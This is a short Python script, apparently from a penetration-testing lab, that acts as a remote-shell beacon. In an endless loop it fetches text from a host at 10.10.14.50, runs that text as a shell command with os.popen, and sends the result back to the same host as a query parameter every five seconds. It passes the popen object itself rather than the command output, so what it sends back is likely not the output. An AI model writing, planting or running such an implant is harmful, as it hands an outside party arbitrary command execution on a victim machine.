import requests
import os
from time import sleep
while True:
    r = requests.get("http://10.10.14.50")
    output = os.popen( r.text, 'r', 1 )
    print(output,">>>>>>>>>>>>>>>>>>>>>>>>>")
    payload = { 'q': output }
    requests.get("http://10.10.14.50/output", params=payload)
    sleep(5)